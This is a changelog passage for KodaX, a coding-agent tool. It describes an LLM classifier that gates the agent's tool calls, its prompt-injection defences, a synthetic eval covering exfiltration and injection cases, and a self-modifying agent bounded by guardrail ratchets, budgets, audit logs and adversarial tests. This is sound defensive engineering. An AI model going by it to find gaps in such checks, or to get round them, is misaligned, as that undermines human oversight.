- **FEATURE_097 P0 — `coerceManagedProtocolToolPayload` skill_map nesting mismatch** (commit `fcab68c`) — `protocol-emitters.ts` JSON schema (lines 227-236) nests `skill_summary` / `execution_obligations` / `verification_obligations` / `ambiguities` / `projection_confidence` inside a `skill_map` object, but the parser at `managed-protocol.ts:339-355` only read these fields at the top level of the payload. When the LLM emitted the schema-correct nested form, `executionObligations` parsed to `[]`, the runner-level seeding gate (`>= 2 obligations` at `runner-driven.ts:881`) never fired, and the realtime todo plan surface never rendered. Parser now reads top-level OR `skill_map` / `skillMap` (snake + camel), with top-level winning when both are present (back-compat). Also tightened the H0 path in `role-prompt.ts:541` so that ≥2-step tasks at H0_DIRECT MUST go through `emit_scout_verdict` with `executionObligations` populated FIRST — only truly trivial single-step H0 work (typo fix, single-line edit) may complete directly without a verdict. 4-case regression test pinned in `protocol-emitters.test.ts` (snake-case nested, camelCase nested, top-level-wins-on-conflict, defensive non-object skill_map).
- **FEATURE_097 P0-followup — emit_scout_verdict timing anchor** (commit `32c5205`) — GLM-as-Scout production transcript revealed Scouts treating `emit_scout_verdict` as a *final report* (called after all the work was done) instead of a *plan commitment* (called early, before the work). The TodoListSurface only renders after emit, so late-emit silently breaks FEATURE_097 even when the parser fix correctly reads `executionObligations`. Tightened the Scout role-prompt with an `EMIT TIMING (CRITICAL)` block that (1) reframes `emit_scout_verdict` as plan commitment vs final report, (2) anchors emit to the first 1-2 scoping turns BEFORE main work, (3) lists the report-pattern anti-pattern verbatim, and (4) narrows the trivial-exemption to "exactly ONE distinct execution step" with explicit callout that review/audit/investigation tasks touching ≥2 files/areas/threads MUST emit early even at H0_DIRECT. Pinned `EXECUTION OBLIGATIONS` Heavy block (lines 520-540) untouched so the 64-cell A/B eval pin holds; new TIMING block sits separately so `obligation_coherence` / `simple_overformalization` metrics are unaffected.
- **FEATURE_092 hotfix-3 — auto-mode classifier defaultProvider/defaultModel staleness** (commit `a1b737a`) — `AutoModeGuardrailConfig.defaultProvider` and `defaultModel` were declared as static `string` fields, captured once at first `getGuardrail()` call. Mid-session `/model` and `/provider` swaps did NOT retarget the auto-mode classifier — it kept calling sideQuery against the original (provider, model) until restart, producing classifier timeouts / errors that escalated to user-confirmation dialogs even though the status bar still read `auto[LLM]`. Compounded in the Ink REPL by a second issue: `runReplApp` declared a top-level `const currentConfig` that was never mutated, so the bootstrap closures `getCurrentProviderName: () => currentConfig.provider` etc. forever returned startup-time values, while the React `useState<CurrentConfig>` (the actual source of truth) was disconnected. Fix has three parts: (1) `AutoModeGuardrailConfig` gains optional `getDefaultProvider?: () => string` / `getDefaultModel?: () => string` fields that take precedence over the static strings inside `buildResolveOptions` — backward compatible since SDK consumers passing `defaultProvider: 'anthropic'` literals still work unchanged; (2) `bootstrapAutoMode` passes live getters wired to `deps.getCurrentProviderName` / `deps.getCurrentModel`, with a warn-log path for empty model; (3) Ink REPL adds `inkCurrentConfigRef` matching the existing `inkAutoModeAskUserRef` / `inkAutoModeEngineChangeRef` pattern — runReplApp-scope ref initialized to `currentConfig`, bootstrap closures read `inkCurrentConfigRef.current.{provider,model,permissionMode}`, component receives `setCurrentConfigRef` prop and syncs via `useEffect(() => setCurrentConfigRef(currentConfig), [currentConfig])`. Readline REPL needed zero changes (its `currentConfig` is a single mutable object and the bootstrap closures pick up live values automatically). Reviewed by 2 sub-agents (architect rejected initial union-type proposal in favor of optional getter fields; code-reviewer caught that closures must capture the ref, not the const, and flagged `getCurrentPermissionMode` for the same fix). 4 new regression tests in `guardrail.test.ts` (getter precedence, per-classify re-evaluation, string-only back-compat, partial getter fallback) + 2 in `auto-mode-bootstrap.test.ts`. `claudeMd` and `rules` deliberately remain captured-at-init by design (mid-session edits to `AGENTS.md` / `~/.kodax/auto-rules.jsonc` are rare; restart applies them).

---

## [0.7.34] - 2026-05-04

### Theme

**FEATURE_097 + FEATURE_110 + FEATURE_112 — three orthogonal v0.7.34 deliveries plus Issue 127/128 fixes.** FEATURE_110 removes the v0.3.1-era legacy plan-mode (path 1) so `PermissionMode="plan"` + `exit_plan_mode` (FEATURE_074, path 2) becomes the sole plan-mode entry. FEATURE_097 adds a Claude Code-style realtime todo plan surface to the AMA Runner — Scout's existing `executionObligations: string[]` is the seed; an in-memory `TodoStore` + new `todo_update` tool drive per-step transitions; a 6-row hard-capped `TodoListSurface` renders under the spinner with auto-anchoring + summary folds + failed-item priority + 5 s post-completion linger. FEATURE_112 lifts the read-only investigation harness ceiling (`deriveTopologyCeiling` +complexity dim, SCOPE COMMITMENT investigation/multi-thread anchors, neutral fan-out copy, ceiling semantics gloss) so deep-investigation tasks can promote to H1 + Evaluator audit instead of staying H0 single-shot.

### Added

- **FEATURE_097 — AMA Runner Realtime Todo List** (commit `a974c57`) — Claude-aligned visibility surface for AMA tasks. Wires Scout's existing `executionObligations: string[]` to a brand-new `TodoListSurface` Ink component under the spinner. Six-row hard cap with auto-anchor on the first `in_progress`, failed-item priority promotion, and 5 s linger after the last item closes. New `todo_update` tool injected into Scout/Generator/Planner tool sets; Evaluator drives the list via runner-side auto-handling (accept → all complete; revise → in_progress→failed→pending across the retry boundary; replan → reset). Layer 2 throttle reminder injects `<system-reminder>` after 8 quiet rounds (per-task scope, single-fire until reset by `todo_update` success or role transition). Heavy mini-planner role-prompt variant pinned VERBATIM into Scout after a 64-cell A/B eval (8 alias × 4 case × 2 variant): Heavy delivers +14.5pp obligation coherence, -8.3pp simple-task over-formalization, +4.3pp harness correctness with multistep completeness ceiling-saturated at 100% on both variants. §5 design decisions all implemented: (1) accept/revise/replan dispatch via runner-side wrapper; (2) `TURNS_SINCE_TODO_UPDATE_REMINDER = 8` per-task throttle; (3) Layer 3 heuristic dropped (YAGNI); (4) task-scoped lifecycle (no session persistence); (5) unknown-id self-recovery returns `{ok:false, reason:"... Current valid ids: ..."}`. Layer independence preserved: `repl` imports `TodoItem` only via `@kodax/coding` public re-export. 102 hermetic tests across store / tool / throttle / view-model / surface; 2 release-gate evals pinned (`feature-097-h0-mini-planner-strength.eval.ts` for Heavy variant decision, `feature-097-prompt-behaviors.eval.ts` for the 4 prompt-eval triggers — throttle reminder recovery, unknown-id self-recovery, generator step progression, planner refinement).
- **FEATURE_112 — Investigation-Scale-Aware Routing (read-scope fix)** (commit `b5ff2b0`) — symmetric counterpart to FEATURE_106's mutation-scope fix. (1) `deriveTopologyCeiling` gains a `complexity` dimension so read-only + complex/systemic tasks can have an H1 ceiling instead of being capped at H0; (2) SCOPE COMMITMENT in the Scout role-prompt extends to investigation-scope (`≥5 files OR ≥8 searches → emit H1`) and multi-thread early-decision (`first 1-2 rounds turn up ≥2 independent threads → dispatch_child_task`) anchors, mirroring the existing mutation-scope rule; (3) `fanoutReason` for `primaryTask=unknown` switches from "No high-value shard class detected" (negative dispatch signal) to "Task scope is unclassified; dispatch_child_task remains available if investigation threads emerge"; (4) `topologyCeiling` field in `decisionSummary` gains a one-line semantic gloss for Scout (`H1_EXECUTE_EVAL` reads "Evaluator can audit your conclusion if you escalate to H1") so the lift in (1) has an inference path. ~21 LoC code + ~80 LoC eval dataset + ~140 LoC tests; eval at `tests/feature-112-read-scope-routing.eval.ts` with 4 cases × 3 alias acceptance.

### Removed

- **Legacy plan-mode (FEATURE_110, path 1)** (commit `6b1df35`) — deleted `runWithPlanMode` / `listPlans` / `resumePlan` / `clearCompletedPlans` / `PlanStorage` / `planStorage` / `ExecutionPlan` and the `/plan` (`/p`) slash command (with all `/plan on|off|once|list|resume|clear` subcommands). The v0.3.1-era readline + chalk wizard was fully superseded by FEATURE_074's `PermissionMode="plan"` + `exit_plan_mode` tool + Ink-native PlanScrollPanel approval UI (v0.7.20). The two paths could conflict at runtime (e.g. `/plan on` + `PermissionMode="plan"` would block writes via `planModeBlockCheck` after wizard `confirm` already y'd them) and the legacy path's KNOWN_ISSUES backlog (`pendingInputs` not wired) had stayed unaddressed for 2+ versions. Net `~ -603` lines removed, 0 added. **Breaking** for any external SDK consumer importing the listed symbols from `kodax` or `@kodax/repl` — all 7 were undocumented internal exports leaking via `src/index.ts` re-export, not present in README's first-class API table. Existing `~/.kodax/plans/*.json` user data is left in place — users may safely `rm -rf ~/.kodax/plans/` after upgrading; KodaX no longer reads or writes those files.

### Fixed

- **Issue 127** (commit `afff423`) — managed-task checkpoint cleanup race in `runManagedTaskViaRunnerInner` left an orphan `checkpoint.json` on every successful single-role H0 task, triggering "found incomplete task / continue / restart / cancel" prompt on the next REPL query. Replaced fire-and-forget `void writeCheckpoint().then(d => last = dir)` with `pendingCheckpointWrites: Promise[]` + `Promise.allSettled` before delete; added `.catch(cleanupRunCheckpoint)` on `Runner.run()` for abort + LLM-error paths; moved cleanup ahead of post-Runner sync block so `buildManagedTaskPayload` / `observer.completed` / `detectScoutSuspiciousSignals` throws cannot bypass cleanup either.
- **Issue 128** (commit `afff423`) — 9 `__contract-tests__/cap-*.contract.test.ts` end-to-end suites + `orchestration.test.ts` flaked at vitest's 5000ms default under heavy parallel load (211 files concurrently). Bumped per-suite timeout to 15s on those 10 suites only (other 91 contract suites + global `testTimeout` untouched so unit-test perf regressions still surface fast).

---

## [0.7.33] - 2026-05-02

### Theme

**FEATURE_092 — Auto Mode Classifier** ships its full release surface. The LLM-reviewed permission tier (Phase 2b classifier core, denial tracker / circuit breaker, model resolver, `AutoModeToolGuardrail` consumer) ships with end-to-end wire-up across both REPL surfaces (readline + Ink), settings / CLI / env override family, slash commands (`/auto-engine`, `/auto-denials`), and a status-bar engine indicator (`Auto[LLM]` green / `Auto[RULES]` yellow) so users can see at a glance whether the classifier downgraded mid-session. The §7 cross-provider release-gate eval (`KODAX_EVAL_AUTO_MODE_CROSS_PROVIDER=1`) verifies 3 cross-provider combos and uncovered a latent bug where `classify()` discarded `sideQuery`'s post-call cost-tracker copy — fixed by threading `setCostTracker` through `ClassifyOptions` so the agent's tracker accumulates classifier calls under `role='auto_mode'`. The canonical `'auto'` permission mode joins `plan` / `accept-edits` (with `'auto-in-project'` retained as a deprecated alias emitting a once-per-session deprecation notice). Status-bar text adopts Title-Case short labels (`Plan` / `Edits` / `Auto[LLM]` / `Auto[RULES]`) matching Claude Code's `permissionModeShortTitle` convention, unified across both readline and Ink surfaces via the new `permissionModeDisplayName` helper.

### Added

- **`@kodax/ai sideQuery` API** (Phase 1, commit `a0e3502`) — independent one-shot LLM invocation for features that need a clean call boundary outside the main agent loop. Constraints by design: `tools=[]` hardcoded, text-only output, independent timeout, `querySource` mapped to `TokenUsageRecord.role` for cost bucketing, never throws (all failures produce a result with `stopReason='timeout' | 'aborted' | 'error'`). First consumer is the auto-mode classifier; future consumers include compaction, title generation, SA mutation reflection. 15 tests covering happy path, isolation guarantees, cost tracking, tool-rejection contract, timeout vs caller-abort label fidelity (deterministic `abortCause` tracking eliminates the race), provider-error path.
- **`@kodax/core GuardrailContext.messages`** (Phase 2a, commit `625fca1`) — optional `messages?: readonly AgentMessage[]` field on `GuardrailContext` so tool-side guardrails can inspect the live conversation transcript without reaching into Runner internals. Runner populates the field at both `beforeTool` and `afterTool` call sites. Backward compatible — existing tool guardrail consumers unaffected.
- **`@kodax/coding classifier-projection` helpers** (Phase 2b.1) — exports `defaultToClassifierInput(name, input)` (conservative `name + truncated JSON` projection for low-risk structured tools) and `mcpToClassifierInput(server, tool, input)` (hybrid projection: extract action field — method/command/url/query/action priority — then append structural context). 14 tests cover projection format, action priority, structure summarization, edge cases (circular refs, primitives, null).
- **Auto-rules JSONC loader** (Phase 2b.2, commit `846e7f0`) — three-layer loader (`~/.kodax/auto-rules.jsonc` user, `<project>/.kodax/auto-rules.jsonc` project, `<project>/.kodax/auto-rules.local.jsonc` local) with sha256 fingerprint-based opt-in trust for project rules (`trustProjectRules` / `readTrustState`), hand-rolled string-aware JSONC parser tolerating both `// /* */` comments and trailing commas, "later layer wins position" dedup semantics. 27 tests.
- **Classifier core** (Phase 2b.3, commit `5bdbebc`) — `classifier-prompt.ts` (system prompt + neutralized envelope: `<rules>`, `<claude_md>`, `<transcript>`, `<action>` with ASCII `< >` defang to `‹ ›` to disarm prompt-injection inside tool_result payloads), `transcript-strip.ts` (drops assistant text/thinking, preserves tool_use/tool_result; 2KB tool_result cap, 8KB total cap; first user message + recent tail kept), `parse-output.ts` (parses `<block>yes|no</block><reason>…</reason>` with FIRST-tag-wins anti-injection, 500-char reason cap), `classify.ts` orchestrator (sideQuery → parse; failure→decision mapping: end_turn→parsed, timeout/error→escalate, aborted→re-throw `DOMException('AbortError')`, unparseable→fail-closed block, tool_use contract violation→block).
- **Denial tracker + circuit breaker** (Phase 2b.4, commit `0c9f8a0`) — pure functional state machines for the engine-downgrade signal: `DenialTracker` (3 consecutive blocks OR 20 cumulative blocks → fallback to rules engine) and `CircuitBreaker` (5 errors / 10-minute sliding window → fallback). 16 tests.
- **Classifier model resolver** (Phase 2b.5, commit `0737190`) — 4-layer override chain (env `KODAX_AUTO_MODE_CLASSIFIER_MODEL` → settings.json → CLI flag → main-agent default) with `parseModelSpec("provider:model")` and graceful fallback to the active conversation provider/model. 16 tests.
- **`AutoModeToolGuardrail` integration** (Phase 2b.6, commit `ef17c70`) — assembles 2b.2 / 2b.3 / 2b.4 / 2b.5 into a single `ToolGuardrail` (FEATURE_085) consumer. Engine starts at the configured value (`'rules'` | `'llm'`); on each tool call it post-records the verdict and downgrades to `'rules'` for the *current* call when the threshold crosses (so the same call that crosses the line is the first to be served by the cheaper engine). Test-only accessors `getEngineForTest` / `getStatsForTest` / `setProviderForTest` for hermetic test wiring. 11 tests.
- **`PermissionMode` 'auto' canonical + 'auto-in-project' alias** (Phase 2b.7a, commit `2866f26`) — adds `'auto'` as the canonical permission mode and keeps `'auto-in-project'` as a deprecated alias. New helpers `CANONICAL_PERMISSION_MODES`, `isAutoMode(m)`, `canonicalizePermissionMode(m)` for boundary-call canonicalization. `normalizePermissionMode` does NOT auto-canonicalize so callers can preserve the user's spelling for diagnostic output. 7 tests.
- **Auto-mode classifier eval dataset** (Phase 2b.9) — `benchmark/datasets/auto-mode-classifier/cases.ts` 14 synthetic cases across 6 tags (`exfiltration` ×2, `remote-exec` ×2, `dest-irrev` ×2, `dep-poisoning` ×1, `prompt-inject` ×2, `legit-work` ×5). `cases.test.ts` (8 hermetic shape tests, no LLM). `tests/auto-mode-classifier.eval.ts` skip-by-default Stage 0 stub — opt-in live measurement via `KODAX_EVAL_AUTO_MODE_LIVE=1`; per-alias TP/FP/escalate counters; quality thresholds NOT enforced yet (gated to Stage 1 post-pilot per `benchmark/datasets/auto-mode-classifier/README.md`).
- **`@kodax/coding` public surface** — auto-mode classifier modules exported under the `// FEATURE_092` heading: `classify`, `loadAutoRules` family, `buildClassifierPrompt`, `stripAssistantText`, `parseClassifierOutput`, denial-tracker family (renamed at the index boundary to `createAutoModeDenialTracker` / `recordAutoModeBlock` / etc. to avoid collision with the FEATURE_044/045 input-signature `DenialTracker` already exported), circuit-breaker family, model-resolver family, `createAutoModeToolGuardrail`, plus all corresponding types.

### Wired through

The Phase 2b roadmap shipped in three waves; what follows is the live surface as of release:

- **Phase 2b.7b — settings / CLI / env wire-up + Runner registration (shipped)**: `KodaXOptions.guardrails`, `KodaXToolExecutionContext.guardrails`, child-executor guardrail propagation (FEATURE_085 `dispatch_child_task`), `bootstrapAutoMode` factory wired in both the readline REPL (`packages/repl/src/interactive/repl.ts`) and the Ink REPL (`packages/repl/src/ui/InkREPL.tsx`), surface-agnostic `askUser` injection (readline wraps `confirmToolExecution`, Ink wraps `showConfirmDialog`), `~/.kodax/config.json` `autoMode.{engine,classifierModel,timeoutMs}` reader, `KODAX_AUTO_MODE_*` env override family, `auto-in-project` deprecation emitter (once-per-session in both REPLs), `/auto` slash command switches to canonical `'auto'` (no longer the deprecated `'auto-in-project'` alias).
- **Phase 2b.8 — slash commands + REPL status bar (shipped)**: `/auto-engine [llm|rules]` and `/auto-denials` slash commands wired in both readline and Ink callbacks (`getAutoModeStats`, `setAutoModeEngine`); status-bar engine indicator (`auto[LLM]` green / `auto[rules]` yellow) applied uniformly across the readline status bar (`status-bar.ts`) and the Ink status-bar view-model (`view-models/status-bar.ts`).
- **§7 cross-provider validation (shipped)**: `tests/auto-mode-cross-provider.eval.ts` — opt-in via `KODAX_EVAL_AUTO_MODE_CROSS_PROVIDER=1`; 3 cross-provider combos (`ds/v4flash → kimi`, `kimi → zhipu/glm51`, `zhipu/glm51 → ds/v4flash`); asserts the classifier provider lands in the cost tracker under `role='auto_mode'`. Run-through uncovered a latent bug where `classify()` discarded `sideQuery`'s post-call tracker copy (immutable pattern) — fixed by threading `setCostTracker` through `ClassifyOptions` so the agent's tracker accumulates classifier calls.

The dataset's Stage 1 (`benchmark/datasets/auto-mode-classifier/README.md`) gates the LLM-engine certification on the 8-alias × 70-cell synthetic pilot — see `benchmark/results/2026-05-02T06-54-27Z-auto-mode-classifier-pilot/`. Hard quality thresholds (TP ≥ 95%, FP ≤ 10%, P90 ≤ 5s) graduate to `expect.fail` post-pilot in v0.7.34+ once defaults stabilize. **Deferred to use-it-and-fix:** §5 downgrade-chain UX validation (3 consecutive blocks → engine flip → user prompt) — manual exercise rather than automated since the chain is user-perception-bound.

**ACP scope note (v0.7.33)**: the canonical `'auto'` permission mode is **not** exposed over ACP. ACP clients see the legacy 3-mode set (`plan`, `accept-edits`, `auto-in-project`) — see code comment on `ACP_PERMISSION_MODE_IDS` in `src/acp_server.ts`. The classifier requires an interactive `askUser` surface (readline / Ink confirm dialog) and `KodaXAcpServer.requestPermissionFromClient` has no protocol slot for the classifier-escalate `<reason>` payload yet; an ACP-native classifier-escalate channel lands in a follow-up version. Until then, ACP's `'auto-in-project'` continues with the pre-v0.7.33 rules-only semantics.

### Changed (BREAKING)

- **`LocalToolDefinition.toClassifierInput: (input: unknown) => string`** is now a **required** field (Phase 2b.1). Authors of custom tools (extensions via FEATURE_034, runtime construction via FEATURE_087) must supply a projection that the auto-mode classifier evaluates. Three-tier strategy:
  - **Zero-risk (read-only / structural):** return `''` — Tier 1 short-circuits the classifier entirely (zero token cost). Examples: read, grep, glob, scaffold/validate/test of construction tools.
  - **High-risk (mutation / network / exec / spawn):** custom projection surfacing the risk-bearing field. Examples: `Bash: ${i.command}`, `Write ${i.path} (${i.content.length} bytes)`, `WebFetch ${i.url}`, `ActivateTool: ${name}@${version}`.
  - **Low-risk structured:** call `defaultToClassifierInput(name, input)` (one-line helper).

  All 41 built-in tools migrated. The construction runtime falls back to `defaultToClassifierInput(artifact.name, input)` for constructed tools that don't yet declare a custom projection (a future artifact-schema field will let authors override). External extension authors must add the field to their `LocalToolDefinition` literals — see JSDoc on the field and the example collection at the top of `packages/coding/src/tools/classifier-projection.ts` for guidance.

---

## [0.7.32] - 2026-05-02

### Theme

Two features close out v0.7.32 and the Plan B roadmap. **FEATURE_090** is the roadmap endpoint and the highest-risk feature in the self-construction series: it lets a constructed agent rewrite **itself**, gated by 5 reflexive stability guarantees (deferred resolver swap protecting the in-flight `Runner.run` reference; LLM diff summary advisory + force-ask-user dialog showing raw prev/next manifests; modification budget hardcoded at N=3 cross-run; chained rollback re-running admission; append-only audit log with diff hash). **FEATURE_107** is a data-driven architecture clean-up: the v0.7.16 design assumption "Planner → fresh Generator session + plan artifact" was never implemented in the v0.7.26 Layer A rewrite (all handoffs are `kind:'continuation'` with `inputFilter:undefined`). The 18-case `h2-plan-execute-boundary` eval (1 real-replay + 17 hand-curated, after Pool 3 archaeology demoted half the original candidate pool) reframed the question to A=current full-transcript vs B=add `inputFilter` to realize v0.7.16 intent. Across 6 alias × 3 cases the two paths produced **identical** Generator outcomes (0pp delta) — variant B is deleted, full-transcript stays, and the v0.7.16 design intent is formally retired. Two production changes ship from FEATURE_107's empirical findings: per-context-window adaptive `triggerPercent` (≤200K → 60%, ≤256K → 65%, ≤500K → 70%, >500K → 75%) because short-window models hit attention degradation around 120K and the legacy 75% default fires too late; and Generator reasoning-discipline (Claude Code's verbatim bidirectional bar for `emit_handoff`) hardcoded into `role-prompt.ts` after boundary suite confirmed it harmless across 6 aliases.

### Added

- **FEATURE_090 — Self-Construction Tier 4: Agent Self-Modifying Role Spec**: A constructed agent (kind=`agent`, authored via `stage_agent_construction`) can now propose a new version of itself by calling the new internal tool `stage_self_modify`. The path enforces 5 stability guarantees:
  - **G1 deferred resolver swap** — `agent-resolver.ts::_pendingSwap` queue holds activated-but-not-live entries; the in-flight `Runner.run` keeps the prior `Agent` reference until the conversation turn ends. REPL drains the queue at the `runAgentRound` `finally` boundary so the new version takes effect on the next turn (works for success, abort, and error paths).
  - **G2 LLM diff summary + force-ask-user** — activate path computes a structured `{ severity, summary, flaggedConcerns }` via the same `LlmReviewClient` interface FEATURE_089 uses (graceful fallback `severity='major'` record when no client is wired). Force-ask-user dialog **always** shows raw prev/next instructions verbatim — the LLM summary is advisory, not load-bearing. Even global `auto-approve` policy is overridden on the self-modify path.
  - **G3 modification budget** — `DEFAULT_SELF_MODIFY_BUDGET=3` hardcoded in `budget.ts`; on-disk file value is ignored and `count` clamped to `>=0` against tampering. Exhausted budget hard-rejects with rule `budget-exhausted`; operator unlocks via `kodax constructed reset-self-modify-budget <name>` (writes a `self_modify_budget_reset` audit row with OS user attribution).
  - **G4 rollback** — `kodax constructed rollback <name>` revokes the current active and re-registers the next-most-recent active version on disk. **Chained**: a second rollback restores the version before that, and so on, back to the original first-time activation. Re-runs admission against the rollback target so a target that no longer admits (system caps tightened, invariants changed) cannot be silently re-registered. Prior versions stay at `status='active'` (not `'archived'`) so the chain has rollback targets.
  - **G5 audit log** — JSONL append-only at `.kodax/constructed/_audit.jsonl` with one entry per lifecycle event (`self_modify_{staged,tested,activated,rejected,rolled_back,disabled,budget_reset}`), each carrying timestamp, agent, version pair, diff hash, severity, OS user, policy verdict, budget remaining, and reject reason. `computeDiffHash(prev, next)` recomputation against on-disk manifests detects post-activate tampering (covered by adversarial test 5).

  6 hard-reject rules in `validateSelfModify` (pure function): `name-changed | kind-invalid | guardrail-ratchet | reasoning-ceiling | budget-exhausted | self-modify-disabled`. Guardrail ratchet is the load-bearing safety check — new `guardrails` set must be a superset of the prior set (adding allowed, removing not). `kodax constructed disable-self-modify <name>` is permanent (no `enable` command by design): writes a marker file `_self_modify_disabled.json` that `validateSelfModify` consults; **presence-wins** semantics — tampering `disabled: false` into the file does not re-enable; malformed JSON treated as fail-safe disabled.

  REPL bootstrap (`packages/repl/src/common/construction-bootstrap.ts`) wires `selfModifyAskUser` through the existing `activeAskUser` cell so the dialog renders LLM summary + severity + flagged concerns + raw prev/next instructions + budget snapshot. Without a bound askUser (ACP / single-shot CLI / child agents) self-modify activation hard-rejects — same defensive default as the regular construction policy.

  **Tests**: 295 green across `validateSelfModify` (16) + `audit-log` + `budget` + `disable-state` + `rollback` + `self-modify-summary` (12) + `runtime-self-modify-activate` (8) + `agent-resolver-pending` (8) + `feature-090-adversarial.test.ts` (7 scenarios: prompt injection in instructions, ratchet violation, capability-tier escalation, recursive within-run self-modify, post-activate audit hash tampering, in-disguise via `stage_agent_construction`, tampered disable marker) + `self-modify-tool` + `self_modify_cli.test.ts` (14, CLIs end-to-end) + `construction-bootstrap.test.ts` (4, REPL wiring contract: bootstrap → activate → drain → next-run resolves new version).

  **Surface**: top-level exports from `@kodax/coding` for `appendAuditEntry` / `readAuditEntries` / `readBudget` / `resetBudget` / `disableSelfModify` / `readDisableState` / `rollbackSelfModify` / `drainPendingSwaps` / `hasPendingSwap` / `resolveConstructedAgent` / `DEFAULT_SELF_MODIFY_BUDGET` + types `AgentArtifact` / `AuditEntry` / `BudgetState` / `DisableState` / `RollbackResult` / `SelfModifyAskUser` / `SelfModifyAskUserInput` / `SelfModifyDiffSummary` / `SelfModifyDiffSeverity`.

- **FEATURE_107 — AMA H2 Plan-Execute Boundary Eval** (architecture validation, not part of Plan B): Pre-registered eval answering whether the v0.7.16 design intent "Planner → fresh Generator session + plan artifact" was producing measurable Generator-quality benefits. **P1.0 candidate scan** (`benchmark/scan-h2-candidates.ts` against `~/.kodax/sessions/`): 533 sessions, 0 real H2 verdicts (confirms the FEATURE_107 telemetry pivot rationale), 45 candidates above heuristic threshold, only 28 with viable git SHAs for replay, only 5 with actual file mutation. **P1.5 dataset** (`benchmark/datasets/h2-plan-execute-boundary/`): 18 cases — 1 real-replay + 17 hand-curated across 5 categories (multi-file feature impl, cross-package refactor, multi-file bugfix, TDD multi-file). After Pool 3 archaeology and three rounds of self-audit (P1.5 / P1.5b / codex review with 3 HIGH + 3 MED + 2 LOW findings folded in), the dataset settled with explicit `mustTouchFiles` / `mustNotTouchFiles` golden signals + natural-language `acceptanceCriteria` for the LLM judge. **P2 harness** (~990 LOC under `benchmark/harness/`): `worktree-runner.ts` (git-worktree isolation envelope; 6/6 tests), `agent-task-runner.ts` (KodaX spawn with isolated HOME + variant-forcing env + binOverride), `h2-boundary-runner.ts` (cases × aliases × variants orchestrator with persisted `matrix.json`), `plan-intent-fidelity.ts` (LLM-as-judge for Generator deliverable vs Planner intent; 11/11 parser tests). **P2.1 source-side eval hooks** (~105 LOC, all tagged `// FEATURE_107 P2.1: DELETE WITH B-PATH IMPL AT P6`): `applyForcedHarness()` (`KODAX_FORCE_MAX_HARNESS` rewrites `plan.harnessProfile`), `stripPlannerReasoningForGenerator` `inputFilter` on `plannerHandoffs` (`KODAX_PLANNER_INPUTFILTER=strip-reasoning`). **Empirical conclusion**: H2-A (full Planner transcript) and H2-B (only `emit_contract` artifact) produce identical Generator outcomes across 6 aliases × 3 cases (0pp delta). Variant B `inputFilter` wiring + supporting code **deleted**; v0.7.16's "new session + plan artifact" design intent formally retired (full-transcript stays). Long-context suite (18 cells, 5 aliases) revealed **context-window length** (not raw model capability) is the dominant factor in long-context quality — short-window models (200-256K) hit attention degradation around 120K. Two production changes shipped from this finding: (a) **per-context-window adaptive `triggerPercent`** in `compaction-config.ts` (≤200K → 60%, ≤256K → 65%, ≤500K → 70%, >500K → 75%); user-explicit `triggerPercent` still wins. (b) **Generator reasoning-discipline** (Claude Code verbatim, bidirectional, "high bar" for `emit_handoff` blocked) hardcoded into `role-prompt.ts`; boundary suite confirmed harmless across 6 aliases. (c) Compaction trigger emits one stderr line per event (default-on, zero-cost observability).

### Fixed

- **`bench` worktree drift detection** — `worktree-runner.ts` orphan scan now catches modifications to **tracked** files, not just untracked additions. Cleans up dead env wiring left over from the P2 design pass that the agent-task-runner never read.

### Documentation

- **EVAL_GUIDELINES rewrite** — `benchmark/EVAL_GUIDELINES.md` now documents the **single-turn probe methodology** as the official KodaX eval pattern and removes end-to-end loop comparisons from the recommended set. Loops conflate prompt quality with tool-availability artefacts (model tries to verify with `read`/`grep`/`bash`, harness can't provide tools, benchmark scores the format-fail). Single-turn probes test the prompt-only contract.
- **FEATURE_108 design** (`docs/features/v0.7.47.md`) — Session-Driven Reflective Prompt Patcher spec landed for v0.7.47 design preview.（注：版本重排后 FEATURE_108 先于 2026-06-05 迁至 v0.7.54，再经后续节奏重排顺延至 [`docs/features/v0.7.95.md`](docs/features/v0.7.95.md)；`v0.7.47.md` 现为 FEATURE_218 + FEATURE_132）
- **FEATURE_109 design** (`docs/features/v0.7.48.md`) — Harness Observability Substrate (long-term memory + prediction contract + cross-family prose guard) spec landed for v0.7.48 design preview.
- **`docs/features/v0.7.29.md` 1496-line expansion** — folds back the historical capability-inventory artifact (`v0.7.29-capability-inventory.md` deleted) and adds deeper FEATURE_103/104/107-related context to the v0.7.29 retrospective.
- **`docs/CODING_AGENT_PROMPTS.md`** — cross-project prompt-system reference (4 open-source coding agents) for KodaX prompt design comparison. Research artefact, not a project doc.
- **`docs/features/v0.7.32.md`** — FEATURE_090 design section drift-corrected against implementation: disable mechanism described as marker file (not allowed-tools removal); prior versions kept at `status='active'` for chained rollback (not `archived`); divergence detection rejected in favour of LLM diff summary; no instructions-keyword static check (intentional simplification — relies on operator + advisory `flaggedConcerns`). Operator-facing usage section integrated directly into the design doc (the standalone `FEATURE_090_USER_GUIDE.md` was deleted to comply with the docs structure rule).
- **`docs/FEATURE_LIST.md`** — `FEATURE_090` and `FEATURE_107` moved from "Planned" to "已完成 Feature" with `v0.7.32 (unreleased)` annotation; "Current released version" pointer advanced to `v0.7.32`; `各版本待做分布` v0.7.32 row dropped (no Planned features remain at this version). Tracker-consistency test green.

### Tests

- 295 new tests across FEATURE_090 surface (construction unit + 4 CLI integration + 7 adversarial scenarios + 4 REPL bootstrap integration). Build green; FEATURE_090 + FEATURE_107 paths exercised end-to-end without regressions to FEATURE_087/088/089/100/101/106 surfaces. `tests/tracker-consistency.test.ts` 4/4 green after FEATURE_LIST.md sync.

### Migration

- No user-facing migration. FEATURE_090's `stage_self_modify` tool is gated to `kind='agent'` constructed artifacts (builtin Scout / Planner / Generator / Evaluator can never self-modify by design — their declarations live in `@kodax/core` and are immutable). `selfModifyAskUser` defaults to `'reject'` on non-interactive surfaces (ACP / single-shot CLI / child agents), preserving the v0.7.28 invariant that self-construction requires explicit operator consent. FEATURE_107's `inputFilter` hooks are deleted with the B-path conclusion — no leftover plumbing. Adaptive compaction `triggerPercent` defaults change automatically on next REPL session start; user-explicit values in config still win. The `.kodax/constructed/_audit.jsonl` and `.kodax/constructed/agents/<name>/_self_modify*.json` files are created lazily on first self-modify event — no migration of existing constructed agents required.

---

## [0.7.31] - 2026-04-29

### Theme

